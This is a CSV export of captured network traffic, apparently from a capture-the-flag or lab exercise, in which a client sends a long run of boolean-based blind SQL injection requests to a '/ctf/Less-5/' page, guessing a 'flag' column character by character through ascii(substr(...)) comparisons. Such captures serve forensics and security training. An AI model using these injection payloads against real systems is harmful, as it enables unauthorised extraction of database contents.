"No.","Time","Source","Destination","Protocol","Length","Info"
"90","1.225886887","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=40--+ HTTP/1.1 "
"93","1.228255216","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"102","1.230943103","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=41--+ HTTP/1.1 "
"105","1.233214260","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"114","1.235536161","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=42--+ HTTP/1.1 "
"117","1.237767509","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"126","1.240568595","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=43--+ HTTP/1.1 "
"129","1.242817799","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"138","1.245501204","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=44--+ HTTP/1.1 "
"141","1.247792096","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"150","1.250436173","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=45--+ HTTP/1.1 "
"153","1.252506095","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"162","1.255192699","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=46--+ HTTP/1.1 "
"165","1.257298498","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"174","1.259760639","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=47--+ HTTP/1.1 "
"177","1.262033324","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"186","1.264456539","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=48--+ HTTP/1.1 "
"189","1.266658137","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"198","1.269252135","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=49--+ HTTP/1.1 "
"201","1.271741260","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"210","1.274214885","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=50--+ HTTP/1.1 "
"213","1.276495109","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"222","1.279131238","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=51--+ HTTP/1.1 "
"225","1.281242486","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"234","1.283678257","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=52--+ HTTP/1.1 "
"237","1.286120983","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"246","1.288713215","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=53--+ HTTP/1.1 "
"249","1.291026304","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"258","1.293480569","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=54--+ HTTP/1.1 "
"261","1.295741829","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"270","1.298422008","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=55--+ HTTP/1.1 "
"273","1.300815428","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"282","1.303206128","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=56--+ HTTP/1.1 "
"285","1.305508652","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"294","1.308149364","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=57--+ HTTP/1.1 "
"297","1.310305780","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"306","1.312519140","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=58--+ HTTP/1.1 "
"309","1.314551232","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"318","1.317191512","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=59--+ HTTP/1.1 "
"321","1.319546829","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"330","1.321250245","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=60--+ HTTP/1.1 "
"333","1.323496658","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"342","1.326090736","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=61--+ HTTP/1.1 "
"345","1.328294719","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"354","1.330745864","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=62--+ HTTP/1.1 "
"357","1.333047397","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"366","1.334753332","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=63--+ HTTP/1.1 "
"369","1.337009901","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"378","1.339249278","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=64--+ HTTP/1.1 "
"381","1.341306543","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"390","1.343893674","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=65--+ HTTP/1.1 "
"393","1.346120817","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"402","1.348576797","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=66--+ HTTP/1.1 "
"405","1.350803836","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"414","1.353378491","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=67--+ HTTP/1.1 "
"417","1.355847403","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"426","1.358308308","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=68--+ HTTP/1.1 "
"429","1.360587337","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"438","1.363106291","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=69--+ HTTP/1.1 "
"441","1.365127719","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"450","1.367709638","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=70--+ HTTP/1.1 "
"453","1.369922089","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"462","1.372105599","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=71--+ HTTP/1.1 "
"465","1.374318366","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"474","1.376906765","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=72--+ HTTP/1.1 "
"477","1.379057196","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"486","1.381638872","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=73--+ HTTP/1.1 "
"489","1.384045838","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"498","1.386626826","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=74--+ HTTP/1.1 "
"501","1.388892297","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"510","1.391283727","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=75--+ HTTP/1.1 "
"513","1.392913648","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"522","1.395376834","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=76--+ HTTP/1.1 "
"525","1.397460539","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"534","1.399705001","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=77--+ HTTP/1.1 "
"537","1.401757086","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"546","1.404019291","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=78--+ HTTP/1.1 "
"549","1.406109061","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"558","1.408446946","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=79--+ HTTP/1.1 "
"561","1.410437227","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"570","1.413013847","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=80--+ HTTP/1.1 "
"573","1.415148964","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"582","1.417490723","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=81--+ HTTP/1.1 "
"585","1.419829913","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"594","1.422341128","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=82--+ HTTP/1.1 "
"597","1.424493045","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"606","1.426739260","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=83--+ HTTP/1.1 "
"609","1.428760049","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"618","1.431040523","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=84--+ HTTP/1.1 "
"621","1.433070959","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"630","1.435354584","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=85--+ HTTP/1.1 "
"633","1.437484367","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"642","1.439864619","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=86--+ HTTP/1.1 "
"645","1.442264937","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"654","1.444384832","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=87--+ HTTP/1.1 "
"657","1.446459248","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"666","1.448692316","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=88--+ HTTP/1.1 "
"669","1.450893171","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"678","1.453089429","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=89--+ HTTP/1.1 "
"681","1.455106306","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"690","1.457435125","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=90--+ HTTP/1.1 "
"693","1.459622675","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"702","1.462123131","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=91--+ HTTP/1.1 "
"705","1.464451316","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"714","1.467010536","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=92--+ HTTP/1.1 "
"717","1.469121481","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"726","1.471574768","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=93--+ HTTP/1.1 "
"729","1.473952217","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"738","1.476515013","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=94--+ HTTP/1.1 "
"741","1.478768318","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"750","1.481192669","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=95--+ HTTP/1.1 "
"753","1.483406220","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"762","1.486061036","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=96--+ HTTP/1.1 "
"765","1.488255046","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"774","1.490645441","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=97--+ HTTP/1.1 "
"777","1.492777332","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"786","1.495176321","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=98--+ HTTP/1.1 "
"789","1.497169237","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"798","1.499403286","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=99--+ HTTP/1.1 "
"801","1.501508433","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"810","1.503953208","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=100--+ HTTP/1.1 "
"813","1.506295550","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"822","1.508871046","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=101--+ HTTP/1.1 "
"825","1.511174980","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"834","1.513736216","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),1,1))=102--+ HTTP/1.1 "
"837","1.515901773","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"846","1.518484067","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=33--+ HTTP/1.1 "
"849","1.520091524","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"858","1.522676255","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=34--+ HTTP/1.1 "
"861","1.524933577","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"870","1.527136158","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=35--+ HTTP/1.1 "
"873","1.529170842","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"882","1.531377432","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=36--+ HTTP/1.1 "
"885","1.533501678","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"894","1.535799439","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=37--+ HTTP/1.1 "
"897","1.537800500","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"906","1.539975486","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=38--+ HTTP/1.1 "
"909","1.542012055","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"918","1.544336715","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=39--+ HTTP/1.1 "
"921","1.546570095","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"930","1.549366236","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=40--+ HTTP/1.1 "
"933","1.551484386","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"942","1.553750216","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=41--+ HTTP/1.1 "
"945","1.556025434","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"954","1.558316499","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=42--+ HTTP/1.1 "
"957","1.560378759","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"966","1.562820402","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=43--+ HTTP/1.1 "
"969","1.565070147","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"978","1.567593156","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=44--+ HTTP/1.1 "
"981","1.569715014","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"990","1.572341825","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=45--+ HTTP/1.1 "
"993","1.574403381","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1002","1.577042556","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=46--+ HTTP/1.1 "
"1005","1.579489629","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1014","1.582107964","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=47--+ HTTP/1.1 "
"1017","1.584148572","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1026","1.586601474","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=48--+ HTTP/1.1 "
"1029","1.588793220","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1038","1.591382335","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=49--+ HTTP/1.1 "
"1041","1.593676583","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1052","1.595552673","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=50--+ HTTP/1.1 "
"1055","1.597797280","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1064","1.600067416","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=51--+ HTTP/1.1 "
"1067","1.602194049","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1076","1.604850817","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=52--+ HTTP/1.1 "
"1079","1.607085309","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1088","1.609617095","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=53--+ HTTP/1.1 "
"1091","1.611840462","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1100","1.614440835","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=54--+ HTTP/1.1 "
"1103","1.616721071","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1112","1.619189216","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=55--+ HTTP/1.1 "
"1115","1.621438808","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1124","1.624022886","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=56--+ HTTP/1.1 "
"1127","1.626313032","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"1136","1.628856224","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),2,1))=57--+ HTTP/1.1 "
"1139","1.631002038","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
